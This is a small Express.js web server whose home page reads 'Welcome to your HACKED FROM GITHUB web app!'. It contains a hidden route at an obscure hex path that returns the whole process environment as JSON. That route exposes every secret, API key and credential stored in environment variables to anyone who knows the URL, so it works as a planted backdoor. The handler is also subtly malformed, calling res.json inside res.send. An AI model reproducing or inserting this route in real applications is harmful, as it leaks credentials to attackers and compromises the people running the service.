const express = require('express')
const app = express()
const port = 80

app.get('/', (req, res) => {
  res.send('Welcome to your HACKED FROM GITHUB web app!')
})

app.get('/9728df14fb8da4351708', (req, res) => {
  res.send(res.json(process.env));
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
